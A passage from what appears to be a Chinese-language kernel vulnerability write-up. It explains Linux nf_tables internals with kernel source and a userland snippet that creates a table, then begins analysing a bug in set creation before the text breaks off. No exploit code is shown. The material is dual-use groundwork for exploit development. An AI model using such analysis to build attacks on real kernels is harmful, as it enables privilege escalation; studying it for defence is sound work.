nft_set_policy,\t&#125;,\t[NFT_MSG_NEWSETELEM] = &#123;\t\t.call_batch\t= nf_tables_newsetelem,\t\t.attr_count\t= NFTA_SET_ELEM_LIST_MAX,\t\t.policy\t\t= nft_set_elem_list_policy,\t&#125;,\t[NFT_MSG_GETSETELEM] = &#123;\t\t.call_rcu\t= nf_tables_getsetelem,\t\t.attr_count\t= NFTA_SET_ELEM_LIST_MAX,\t\t.policy\t\t= nft_set_elem_list_policy,\t&#125;,\t[NFT_MSG_DELSETELEM] = &#123;\t\t.call_batch\t= nf_tables_delsetelem,\t\t.attr_count\t= NFTA_SET_ELEM_LIST_MAX,\t\t.policy\t\t= nft_set_elem_list_policy,\t&#125;,\t[NFT_MSG_GETGEN] = &#123;\t\t.call_rcu\t= nf_tables_getgen,\t&#125;,\t[NFT_MSG_NEWOBJ] = &#123;\t\t.call_batch\t= nf_tables_newobj,\t\t.attr_count\t= NFTA_OBJ_MAX,\t\t.policy\t\t= nft_obj_policy,\t&#125;,\t[NFT_MSG_GETOBJ] = &#123;\t\t.call_rcu\t= nf_tables_getobj,\t\t.attr_count\t= NFTA_OBJ_MAX,\t\t.policy\t\t= nft_obj_policy,\t&#125;,\t[NFT_MSG_DELOBJ] = &#123;\t\t.call_batch\t= nf_tables_delobj,\t\t.attr_count\t= NFTA_OBJ_MAX,\t\t.policy\t\t= nft_obj_policy,\t&#125;,\t[NFT_MSG_GETOBJ_RESET] = &#123;\t\t.call_rcu\t= nf_tables_getobj,\t\t.attr_count\t= NFTA_OBJ_MAX,\t\t.policy\t\t= nft_obj_policy,\t&#125;,\t[NFT_MSG_NEWFLOWTABLE] = &#123;\t\t.call_batch\t= nf_tables_newflowtable,\t\t.attr_count\t= NFTA_FLOWTABLE_MAX,\t\t.policy\t\t= nft_flowtable_policy,\t&#125;,\t[NFT_MSG_GETFLOWTABLE] = &#123;\t\t.call_rcu\t= nf_tables_getflowtable,\t\t.attr_count\t= NFTA_FLOWTABLE_MAX,\t\t.policy\t\t= nft_flowtable_policy,\t&#125;,\t[NFT_MSG_DELFLOWTABLE] = &#123;\t\t.call_batch\t= nf_tables_delflowtable,\t\t.attr_count\t= NFTA_FLOWTABLE_MAX,\t\t.policy\t\t= nft_flowtable_policy,\t&#125;,&#125;;\n\n上述nfnetlink_subsystem结构体中cb成员即客户端，再看对应的nf_tables_cb针对不同的操作定义了多个回调客户端，例如NEWTABLE、NEW_CHAIN之类的操作。\n创建table操作uint8_t family = NFPROTO_IPV4;struct nftnl_table *table = nftnl_table_alloc();nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(buf, sizeof(buf));int seq = 0;nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);mnl_nlmsg_batch_next(batch);struct nlmsghdr *nlh;int table_seq = seq;nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);nftnl_table_nlmsg_build_payload(nlh, table);nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);mnl_nlmsg_batch_next(batch);if (nl == NULL)  errExit(1, &quot;mnl_socket_open&quot;);  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),                          mnl_nlmsg_batch_size(batch)) &lt; 0)  err(1, &quot;mnl_socket_send&quot;);\n\n上面就是生成一个table的小🌰。\nif (nc-&gt;call_batch) &#123;  err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,                       (const struct nlattr **)cda,                       &amp;extack);&#125;\n\n然后在内核中会调用客户端对应的call_batch成员，这里创建table对应的就是nf_tables_newtable函数了。\nstatic int nf_tables_newtable(struct net *net, struct sock *nlsk,\t\t\t      struct sk_buff *skb, const struct nlmsghdr *nlh,\t\t\t      const struct nlattr * const nla[],\t\t\t      struct netlink_ext_ack *extack)&#123;\tconst struct nfgenmsg *nfmsg = nlmsg_data(nlh);\tu8 genmask = nft_genmask_next(net);\tint family = nfmsg-&gt;nfgen_family;\tconst struct nlattr *attr;\tstruct nft_table *table;\tu32 flags = 0;\tstruct nft_ctx ctx;\tint err;\tlockdep_assert_held(&amp;net-&gt;nft.commit_mutex);\tattr = nla[NFTA_TABLE_NAME];\ttable = nft_table_lookup(net, attr, family, genmask);\tif (IS_ERR(table)) &#123;\t\tif (PTR_ERR(table) != -ENOENT)\t\t\treturn PTR_ERR(table);\t&#125; else &#123;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;\t\t\tNL_SET_BAD_ATTR(extack, attr);\t\t\treturn -EEXIST;\t\t&#125;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)\t\t\treturn -EOPNOTSUPP;\t\tnft_ctx_init(&amp;ctx, net, skb, nlh, family, table, NULL, nla);\t\treturn nf_tables_updtable(&amp;ctx);\t&#125;\tif (nla[NFTA_TABLE_FLAGS]) &#123;\t\tflags = ntohl(nla_get_be32(nla[NFTA_TABLE_FLAGS]));\t\tif (flags &amp; ~NFT_TABLE_F_DORMANT)\t\t\treturn -EINVAL;\t&#125;\terr = -ENOMEM;\ttable = kzalloc(sizeof(*table), GFP_KERNEL);\tif (table == NULL)\t\tgoto err_kzalloc;\ttable-&gt;name = nla_strdup(attr, GFP_KERNEL);\tif (table-&gt;name == NULL)\t\tgoto err_strdup;\terr = rhltable_init(&amp;table-&gt;chains_ht, &amp;nft_chain_ht_params);\tif (err)\t\tgoto err_chain_ht;\tINIT_LIST_HEAD(&amp;table-&gt;chains);\tINIT_LIST_HEAD(&amp;table-&gt;sets);\tINIT_LIST_HEAD(&amp;table-&gt;objects);\tINIT_LIST_HEAD(&amp;table-&gt;flowtables);\ttable-&gt;family = family;\ttable-&gt;flags = flags;\ttable-&gt;handle = ++table_handle;\tnft_ctx_init(&amp;ctx, net, skb, nlh, family, table, NULL, nla);\terr = nft_trans_table_add(&amp;ctx, NFT_MSG_NEWTABLE);\tif (err &lt; 0)\t\tgoto err_trans;\tlist_add_tail_rcu(&amp;table-&gt;list, &amp;net-&gt;nft.tables);\treturn 0;err_trans:\trhltable_destroy(&amp;table-&gt;chains_ht);err_chain_ht:\tkfree(table-&gt;name);err_strdup:\tkfree(table);err_kzalloc:\treturn err;&#125;\n\n首先使用attr = nla[NFTA_TABLE_NAME];查找是否存在table，如果存在则调用nf_tables_updtable(&amp;ctx);进行更新，如果不存在则使用kzalloc创建，然后最后将其放到上下文中，并且加入到&amp;net-&gt;nft.tables中。\n创建chain操作static int nf_tables_newchain(struct net *net, struct sock *nlsk,\t\t\t      struct sk_buff *skb, const struct nlmsghdr *nlh,\t\t\t      const struct nlattr * const nla[],\t\t\t      struct netlink_ext_ack *extack)&#123;\tconst struct nfgenmsg *nfmsg = nlmsg_data(nlh);\tu8 genmask = nft_genmask_next(net);\tint family = nfmsg-&gt;nfgen_family;\tconst struct nlattr *attr;\tstruct nft_table *table;\tstruct nft_chain *chain;\tu8 policy = NF_ACCEPT;\tstruct nft_ctx ctx;\tu64 handle = 0;\tlockdep_assert_held(&amp;net-&gt;nft.commit_mutex);\ttable = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);\tif (IS_ERR(table)) &#123;\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_TABLE]);\t\treturn PTR_ERR(table);\t&#125;\tchain = NULL;\tattr = nla[NFTA_CHAIN_NAME];\tif (nla[NFTA_CHAIN_HANDLE]) &#123;\t\thandle = be64_to_cpu(nla_get_be64(nla[NFTA_CHAIN_HANDLE]));\t\tchain = nft_chain_lookup_byhandle(table, handle, genmask);\t\tif (IS_ERR(chain)) &#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_HANDLE]);\t\t\treturn PTR_ERR(chain);\t\t&#125;\t\tattr = nla[NFTA_CHAIN_HANDLE];\t&#125; else &#123;\t\tchain = nft_chain_lookup(net, table, attr, genmask);\t\tif (IS_ERR(chain)) &#123;\t\t\tif (PTR_ERR(chain) != -ENOENT) &#123;\t\t\t\tNL_SET_BAD_ATTR(extack, attr);\t\t\t\treturn PTR_ERR(chain);\t\t\t&#125;\t\t\tchain = NULL;\t\t&#125;\t&#125;\tif (nla[NFTA_CHAIN_POLICY]) &#123;\t\tif (chain != NULL &amp;&amp;\t\t    !nft_is_base_chain(chain)) &#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);\t\t\treturn -EOPNOTSUPP;\t\t&#125;\t\tif (chain == NULL &amp;&amp;\t\t    nla[NFTA_CHAIN_HOOK] == NULL) &#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);\t\t\treturn -EOPNOTSUPP;\t\t&#125;\t\tpolicy = ntohl(nla_get_be32(nla[NFTA_CHAIN_POLICY]));\t\tswitch (policy) &#123;\t\tcase NF_DROP:\t\tcase NF_ACCEPT:\t\t\tbreak;\t\tdefault:\t\t\treturn -EINVAL;\t\t&#125;\t&#125;\tnft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);\tif (chain != NULL) &#123;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;\t\t\tNL_SET_BAD_ATTR(extack, attr);\t\t\treturn -EEXIST;\t\t&#125;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)\t\t\treturn -EOPNOTSUPP;\t\treturn nf_tables_updchain(&amp;ctx, genmask, policy);\t&#125;\treturn nf_tables_addchain(&amp;ctx, family, genmask, policy);&#125;\n\n首先通过table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);获取对应的table，如果是没有则直接退出。然后上面存在两种方式寻找chain，如果找到了调用nf_tables_updchain(&amp;ctx, genmask, policy);进行更新即可，如果没有则使用nf_tables_addchain(&amp;ctx, family, genmask, policy);添加。\nstatic int nf_tables_addchain(struct nft_ctx *ctx, u8 family, u8 genmask,                              u8 policy)&#123;  const struct nlattr * const *nla = ctx-&gt;nla;  struct nft_table *table = ctx-&gt;table;  struct nft_base_chain *basechain;  struct nft_stats __percpu *stats;  struct net *net = ctx-&gt;net;  struct nft_chain *chain;  struct nft_rule **rules;  int err;  if (table-&gt;use == UINT_MAX)    return -EOVERFLOW;  if (nla[NFTA_CHAIN_HOOK]) &#123;    struct nft_chain_hook hook;    struct nf_hook_ops *ops;    err = nft_chain_parse_hook(net, nla, &amp;hook, family, true);    if (err &lt; 0)      return err;    basechain = kzalloc(sizeof(*basechain), GFP_KERNEL);    if (basechain == NULL) &#123;      nft_chain_release_hook(&amp;hook);      return -ENOMEM;    &#125;    if (hook.dev != NULL)      strncpy(basechain-&gt;dev_name, hook.dev-&gt;name, IFNAMSIZ);    if (nla[NFTA_CHAIN_COUNTERS]) &#123;      stats = nft_stats_alloc(nla[NFTA_CHAIN_COUNTERS]);      if (IS_ERR(stats)) &#123;        nft_chain_release_hook(&amp;hook);        kfree(basechain);        return PTR_ERR(stats);      &#125;      rcu_assign_pointer(basechain-&gt;stats, stats);      static_branch_inc(&amp;nft_counters_enabled);    &#125;    basechain-&gt;type = hook.type;    chain = &amp;basechain-&gt;chain;    ops\t\t= &amp;basechain-&gt;ops;    ops-&gt;pf\t\t= family;    ops-&gt;hooknum\t= hook.num;    ops-&gt;priority\t= hook.priority;    ops-&gt;priv\t= chain;    ops-&gt;hook\t= hook.type-&gt;hooks[ops-&gt;hooknum];    ops-&gt;dev\t= hook.dev;    chain-&gt;flags |= NFT_BASE_CHAIN;    basechain-&gt;policy = policy;  &#125; else &#123;    chain = kzalloc(sizeof(*chain), GFP_KERNEL);    if (chain == NULL)      return -ENOMEM;  &#125;  ctx-&gt;chain = chain;  INIT_LIST_HEAD(&amp;chain-&gt;rules);  chain-&gt;handle = nf_tables_alloc_handle(table);  chain-&gt;table = table;  chain-&gt;name = nla_strdup(nla[NFTA_CHAIN_NAME], GFP_KERNEL);  if (!chain-&gt;name) &#123;    err = -ENOMEM;    goto err1;  &#125;  rules = nf_tables_chain_alloc_rules(chain, 0);  if (!rules) &#123;    err = -ENOMEM;    goto err1;  &#125;  *rules = NULL;  rcu_assign_pointer(chain-&gt;rules_gen_0, rules);  rcu_assign_pointer(chain-&gt;rules_gen_1, rules);  err = nf_tables_register_hook(net, table, chain);  if (err &lt; 0)    goto err1;  err = rhltable_insert_key(&amp;table-&gt;chains_ht, chain-&gt;name,                            &amp;chain-&gt;rhlhead, nft_chain_ht_params);  if (err)    goto err2;  err = nft_trans_chain_add(ctx, NFT_MSG_NEWCHAIN);  if (err &lt; 0) &#123;    rhltable_remove(&amp;table-&gt;chains_ht, &amp;chain-&gt;rhlhead,                    nft_chain_ht_params);    goto err2;  &#125;  table-&gt;use++;  list_add_tail_rcu(&amp;chain-&gt;list, &amp;table-&gt;chains);  return 0;  err2:  nf_tables_unregister_hook(net, table, chain);  err1:  nf_tables_chain_destroy(ctx);  return err;&#125;\n\n首先使用basechain = kzalloc(sizeof(*basechain), GFP_KERNEL);创建basechain\nstruct nft_base_chain &#123;\tstruct nf_hook_ops\t\tops;\tconst struct nft_chain_type\t*type;\tu8\t\t\t\tpolicy;\tu8\t\t\t\tflags;\tstruct nft_stats __percpu\t*stats;\tstruct nft_chain\t\tchain;\tchar \t\t\t\tdev_name[IFNAMSIZ];&#125;;\n\n随后将其中的成员地址给到chain，后续就是一系列的初始化环节\n创建rule操作static int nf_tables_newrule(struct net *net, struct sock *nlsk,\t\t\t     struct sk_buff *skb, const struct nlmsghdr *nlh,\t\t\t     const struct nlattr * const nla[],\t\t\t     struct netlink_ext_ack *extack)&#123;\tconst struct nfgenmsg *nfmsg = nlmsg_data(nlh);\tu8 genmask = nft_genmask_next(net);\tstruct nft_expr_info *info = NULL;\tint family = nfmsg-&gt;nfgen_family;\tstruct nft_table *table;\tstruct nft_chain *chain;\tstruct nft_rule *rule, *old_rule = NULL;\tstruct nft_userdata *udata;\tstruct nft_trans *trans = NULL;\tstruct nft_expr *expr;\tstruct nft_ctx ctx;\tstruct nlattr *tmp;\tunsigned int size, i, n, ulen = 0, usize = 0;\tint err, rem;\tu64 handle, pos_handle;\tlockdep_assert_held(&amp;net-&gt;nft.commit_mutex);\ttable = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask);\tif (IS_ERR(table)) &#123;\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);\t\treturn PTR_ERR(table);\t&#125;\tchain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN], genmask);\tif (IS_ERR(chain)) &#123;\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);\t\treturn PTR_ERR(chain);\t&#125;\tif (nla[NFTA_RULE_HANDLE]) &#123;\t\thandle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_HANDLE]));\t\trule = __nft_rule_lookup(chain, handle);\t\tif (IS_ERR(rule)) &#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);\t\t\treturn PTR_ERR(rule);\t\t&#125;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);\t\t\treturn -EEXIST;\t\t&#125;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)\t\t\told_rule = rule;\t\telse\t\t\treturn -EOPNOTSUPP;\t&#125; else &#123;\t\tif (!(nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE) ||\t\t    nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)\t\t\treturn -EINVAL;\t\thandle = nf_tables_alloc_handle(table);\t\tif (chain-&gt;use == UINT_MAX)\t\t\treturn -EOVERFLOW;\t\tif (nla[NFTA_RULE_POSITION]) &#123;\t\t\tpos_handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_POSITION]));\t\t\told_rule = __nft_rule_lookup(chain, pos_handle);\t\t\tif (IS_ERR(old_rule)) &#123;\t\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION]);\t\t\t\treturn PTR_ERR(old_rule);\t\t\t&#125;\t\t&#125; else if (nla[NFTA_RULE_POSITION_ID]) &#123;\t\t\told_rule = nft_rule_lookup_byid(net, nla[NFTA_RULE_POSITION_ID]);\t\t\tif (IS_ERR(old_rule)) &#123;\t\t\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION_ID]);\t\t\t\treturn PTR_ERR(old_rule);\t\t\t&#125;\t\t&#125;\t&#125;\tnft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);\tn = 0;\tsize = 0;\tif (nla[NFTA_RULE_EXPRESSIONS]) &#123;\t\tinfo = kvmalloc_array(NFT_RULE_MAXEXPRS,\t\t\t\t      sizeof(struct nft_expr_info),\t\t\t\t      GFP_KERNEL);\t\tif (!info)\t\t\treturn -ENOMEM;\t\tnla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;\t\t\terr = -EINVAL;\t\t\tif (nla_type(tmp) != NFTA_LIST_ELEM)\t\t\t\tgoto err1;\t\t\tif (n == NFT_RULE_MAXEXPRS)\t\t\t\tgoto err1;\t\t\terr = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);\t\t\tif (err &lt; 0)\t\t\t\tgoto err1;\t\t\tsize += info[n].ops-&gt;size;\t\t\tn++;\t\t&#125;\t&#125;\t/* Check for overflow of dlen field */\terr = -EFBIG;\tif (size &gt;= 1 &lt;&lt; 12)\t\tgoto err1;\tif (nla[NFTA_RULE_USERDATA]) &#123;\t\tulen = nla_len(nla[NFTA_RULE_USERDATA]);\t\tif (ulen &gt; 0)\t\t\tusize = sizeof(struct nft_userdata) + ulen;\t&#125;\terr = -ENOMEM;\trule = kzalloc(sizeof(*rule) + size + usize, GFP_KERNEL);\tif (rule == NULL)\t\tgoto err1;\tnft_activate_next(net, rule);\trule-&gt;handle = handle;\trule-&gt;dlen   = size;\trule-&gt;udata  = ulen ? 1 : 0;\tif (ulen) &#123;\t\tudata = nft_userdata(rule);\t\tudata-&gt;len = ulen - 1;\t\tnla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);\t&#125;\texpr = nft_expr_first(rule);\tfor (i = 0; i &lt; n; i++) &#123;\t\terr = nf_tables_newexpr(&amp;ctx, &amp;info[i], expr);\t\tif (err &lt; 0)\t\t\tgoto err2;\t\tif (info[i].ops-&gt;validate)\t\t\tnft_validate_state_update(net, NFT_VALIDATE_NEED);\t\tinfo[i].ops = NULL;\t\texpr = nft_expr_next(expr);\t&#125;\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE) &#123;\t\ttrans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);\t\tif (trans == NULL) &#123;\t\t\terr = -ENOMEM;\t\t\tgoto err2;\t\t&#125;\t\terr = nft_delrule(&amp;ctx, old_rule);\t\tif (err &lt; 0) &#123;\t\t\tnft_trans_destroy(trans);\t\t\tgoto err2;\t\t&#125;\t\tlist_add_tail_rcu(&amp;rule-&gt;list, &amp;old_rule-&gt;list);\t&#125; else &#123;\t\tif (nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule) == NULL) &#123;\t\t\terr = -ENOMEM;\t\t\tgoto err2;\t\t&#125;\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_APPEND) &#123;\t\t\tif (old_rule)\t\t\t\tlist_add_rcu(&amp;rule-&gt;list, &amp;old_rule-&gt;list);\t\t\telse\t\t\t\tlist_add_tail_rcu(&amp;rule-&gt;list, &amp;chain-&gt;rules);\t\t &#125; else &#123;\t\t\tif (old_rule)\t\t\t\tlist_add_tail_rcu(&amp;rule-&gt;list, &amp;old_rule-&gt;list);\t\t\telse\t\t\t\tlist_add_rcu(&amp;rule-&gt;list, &amp;chain-&gt;rules);\t\t&#125;\t&#125;\tkvfree(info);\tchain-&gt;use++;\tif (net-&gt;nft.validate_state == NFT_VALIDATE_DO)\t\treturn nft_table_validate(net, table);\treturn 0;err2:\tnf_tables_rule_release(&amp;ctx, rule);err1:\tfor (i = 0; i &lt; n; i++) &#123;\t\tif (info[i].ops) &#123;\t\t\tmodule_put(info[i].ops-&gt;type-&gt;owner);\t\t\tif (info[i].ops-&gt;type-&gt;release_ops)\t\t\t\tinfo[i].ops-&gt;type-&gt;release_ops(info[i].ops);\t\t&#125;\t&#125;\tkvfree(info);\treturn err;&#125;\n\n首先前两步就是获取table和chain，若是设置了nla[NFTA_RULE_EXPRESSIONS]则遍历所有的expression的大小，并赋值给size。若是设置了nla[NFTA_RULE_USERDATA]则是把userdata的大小放到usize中。\nrule = kzalloc(sizeof(*rule) + size + usize, GFP_KERNEL);随即调用这条语句分配rule，紧接着就是一系列初始化。\n创建expression操作创建expression的操作其实也是发生在nf_tables_newrule函数中的。\nif (nla[NFTA_RULE_EXPRESSIONS]) &#123;  info = kvmalloc_array(NFT_RULE_MAXEXPRS,                        sizeof(struct nft_expr_info),                        GFP_KERNEL);  if (!info)    return -ENOMEM;  nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;    err = -EINVAL;    if (nla_type(tmp) != NFTA_LIST_ELEM)      goto err1;    if (n == NFT_RULE_MAXEXPRS)      goto err1;    err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);    if (err &lt; 0)      goto err1;    size += info[n].ops-&gt;size;    n++;  &#125;&#125;\n\n首先是在这里通过nf_tables_expr_parse初始化info为某个type的ops。\nstatic const struct nft_expr_type *__nft_expr_type_get(u8 family,\t\t\t\t\t\t       struct nlattr *nla)&#123;\tconst struct nft_expr_type *type;\tlist_for_each_entry(type, &amp;nf_tables_expressions, list) &#123;\t\tif (!nla_strcmp(nla, type-&gt;name) &amp;&amp;\t\t    (!type-&gt;family || type-&gt;family == family))\t\t\treturn type;\t&#125;\treturn NULL;&#125;\n\nnf_tables_expr_parse最终会调用到__nft_expr_type_get随后遍历nf_tables_expressions，找到对应的type。\nenum &#123;\tNFPROTO_UNSPEC =  0,\tNFPROTO_INET   =  1,\tNFPROTO_IPV4   =  2,\tNFPROTO_ARP    =  3,\tNFPROTO_NETDEV =  5,\tNFPROTO_BRIDGE =  7,\tNFPROTO_IPV6   = 10,\tNFPROTO_DECNET = 12,\tNFPROTO_NUMPROTO,&#125;;static struct nft_expr_type *nft_basic_types[] = &#123;\t&amp;nft_imm_type,\t&amp;nft_cmp_type,\t&amp;nft_lookup_type,\t&amp;nft_bitwise_type,\t&amp;nft_byteorder_type,\t&amp;nft_payload_type,\t&amp;nft_dynset_type,\t&amp;nft_range_type,\t&amp;nft_meta_type,\t&amp;nft_rt_type,\t&amp;nft_exthdr_type,\t&amp;nft_last_type,&#125;;\n\n所以根据上面的例子看，这里会调用到的是nft_lookup_type\nstatic const struct nft_expr_ops nft_lookup_ops = &#123;\t.type\t\t= &amp;nft_lookup_type,\t.size\t\t= NFT_EXPR_SIZE(sizeof(struct nft_lookup)),\t.eval\t\t= nft_lookup_eval,\t.init\t\t= nft_lookup_init,\t.activate\t= nft_lookup_activate,\t.deactivate\t= nft_lookup_deactivate,\t.destroy\t= nft_lookup_destroy,\t.dump\t\t= nft_lookup_dump,\t.validate\t= nft_lookup_validate,&#125;;struct nft_expr_type nft_lookup_type __read_mostly = &#123;\t.name\t\t= &quot;lookup&quot;,\t.ops\t\t= &amp;nft_lookup_ops,\t.policy\t\t= nft_lookup_policy,\t.maxattr\t= NFTA_LOOKUP_MAX,\t.owner\t\t= THIS_MODULE,&#125;;\n\nstatic int nf_tables_newexpr(const struct nft_ctx *ctx,\t\t\t     const struct nft_expr_info *info,\t\t\t     struct nft_expr *expr)&#123;\tconst struct nft_expr_ops *ops = info-&gt;ops;\tint err;\texpr-&gt;ops = ops;\tif (ops-&gt;init) &#123;\t\terr = ops-&gt;init(ctx, expr, (const struct nlattr **)info-&gt;tb);\t\tif (err &lt; 0)\t\t\tgoto err1;\t&#125;\treturn 0;err1:\texpr-&gt;ops = NULL;\treturn err;&#125;\n\n最终根据不同类型进行初始化。\n漏洞分析漏洞发生在创建set的过程中\nstatic int nf_tables_newset(struct sk_buff *skb, const struct nfnl_info *info,\t\t\t    const struct nlattr *const nla[])&#123;\tu32 ktype, dtype, flags, policy, gc_int, objtype;\tstruct netlink_ext_ack *extack = info-&gt;extack;\tu8 genmask = nft_genmask_next(info-&gt;net);\tu8 family = info-&gt;nfmsg-&gt;nfgen_family;\tconst struct nft_set_ops *ops;\tstruct nft_expr *expr = NULL;\tstruct net *net = info-&gt;net;\tstruct nft_set_desc desc;\tstruct nft_table *table;\tunsigned char *udata;\tstruct nft_set *set;\tstruct nft_ctx ctx;\tsize_t alloc_size;\tu64 timeout;\tchar *name;\tint err, i;\tu16 udlen;\tu64 size;\tif (nla[NFTA_SET_TABLE] == NULL || nla[NFTA_SET_NAME] == NULL ||\t    nla[NFTA_SET_KEY_LEN] == NULL || nla[NFTA_SET_ID] == NULL)\t\treturn -EINVAL;\tmemset(&amp;desc, 0, sizeof(desc));\tktype = NFT_DATA_VALUE;\tif (nla[NFTA_SET_KEY_TYPE] != NULL) &#123;\t\tktype = ntohl(nla_get_be32(nla[NFTA_SET_KEY_TYPE]));\t\tif ((ktype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK)\t\t\treturn -EINVAL;\t&#125;\tdesc.klen = ntohl(nla_get_be32(nla[NFTA_SET_KEY_LEN]));\tif (desc.klen == 0 || desc.klen &gt; NFT_DATA_VALUE_MAXLEN)\t\treturn -EINVAL;\tflags = 0;\tif (nla[NFTA_SET_FLAGS] != NULL) &#123;\t\tflags = ntohl(nla_get_be32(nla[NFTA_SET_FLAGS]));\t\tif (flags &amp;\t\t    ~(NFT_SET_ANONYMOUS | NFT_SET_CONSTANT | NFT_SET_INTERVAL |\t\t      NFT_SET_TIMEOUT | NFT_SET_MAP | NFT_SET_EVAL |\t\t      NFT_SET_OBJECT | NFT_SET_CONCAT | NFT_SET_EXPR))\t\t\treturn -EOPNOTSUPP;\t\t/* Only one of these operations is supported */\t\tif ((flags &amp; (NFT_SET_MAP | NFT_SET_OBJECT)) ==\t\t    (NFT_SET_MAP | NFT_SET_OBJECT))\t\t\treturn -EOPNOTSUPP;\t\tif ((flags &amp; (NFT_SET_EVAL | NFT_SET_OBJECT)) ==\t\t    (NFT_SET_EVAL | NFT_SET_OBJECT))\t\t\treturn -EOPNOTSUPP;\t&#125;\tdtype = 0;\tif (nla[NFTA_SET_DATA_TYPE] != NULL) &#123;\t\tif (!(flags &amp; NFT_SET_MAP))\t\t\treturn -EINVAL;\t\tdtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));\t\tif ((dtype &amp; NFT_DATA_RESERVED_MASK) ==\t\t\t    NFT_DATA_RESERVED_MASK &amp;&amp;\t\t    dtype != NFT_DATA_VERDICT)\t\t\treturn -EINVAL;\t\tif (dtype != NFT_DATA_VERDICT) &#123;\t\t\tif (nla[NFTA_SET_DATA_LEN] == NULL)\t\t\t\treturn -EINVAL;\t\t\tdesc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));\t\t\tif (desc.dlen == 0 || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)\t\t\t\treturn -EINVAL;\t\t&#125; else\t\t\tdesc.dlen = sizeof(struct nft_verdict);\t&#125; else if (flags &amp; NFT_SET_MAP)\t\treturn -EINVAL;\tif (nla[NFTA_SET_OBJ_TYPE] != NULL) &#123;\t\tif (!(flags &amp; NFT_SET_OBJECT))\t\t\treturn -EINVAL;\t\tobjtype = ntohl(nla_get_be32(nla[NFTA_SET_OBJ_TYPE]));\t\tif (objtype == NFT_OBJECT_UNSPEC || objtype &gt; NFT_OBJECT_MAX)\t\t\treturn -EOPNOTSUPP;\t&#125; else if (flags &amp; NFT_SET_OBJECT)\t\treturn -EINVAL;\telse\t\tobjtype = NFT_OBJECT_UNSPEC;\ttimeout = 0;\tif (nla[NFTA_SET_TIMEOUT] != NULL) &#123;\t\tif (!(flags &amp; NFT_SET_TIMEOUT))\t\t\treturn -EINVAL;\t\terr = nf_msecs_to_jiffies64(nla[NFTA_SET_TIMEOUT], &amp;timeout);\t\tif (err)\t\t\treturn err;\t&#125;\tgc_int = 0;\tif (nla[NFTA_SET_GC_INTERVAL] != NULL) &#123;\t\tif (!(flags &amp; NFT_SET_TIMEOUT))\t\t\treturn -EINVAL;\t\tgc_int = ntohl(nla_get_be32(nla[NFTA_SET_GC_INTERVAL]));\t&#125;\tpolicy = NFT_SET_POL_PERFORMANCE;\tif (nla[NFTA_SET_POLICY] != NULL)\t\tpolicy = ntohl(nla_get_be32(nla[NFTA_SET_POLICY]));\tif (nla[NFTA_SET_DESC] != NULL) &#123;\t\terr = nf_tables_set_desc_parse(&amp;desc, nla[NFTA_SET_DESC]);\t\tif (err &lt; 0)\t\t\treturn err;\t&#125;\tif (nla[NFTA_SET_EXPR] || nla[NFTA_SET_EXPRESSIONS])\t\tdesc.expr = true;\ttable = nft_table_lookup(net, nla[NFTA_SET_TABLE], family, genmask,\t\t\t\t NETLINK_CB(skb).portid);\tif (IS_ERR(table)) &#123;\t\tNL_SET_BAD_ATTR(extack, nla[NFTA_SET_TABLE]);\t\treturn PTR_ERR(table);\t&#125;\tnft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, NULL, nla);\tset = nft_set_lookup(table, nla[NFTA_SET_NAME], genmask);\tif (IS_ERR(set)) &#123;\t\tif (PTR_ERR(set) != -ENOENT) 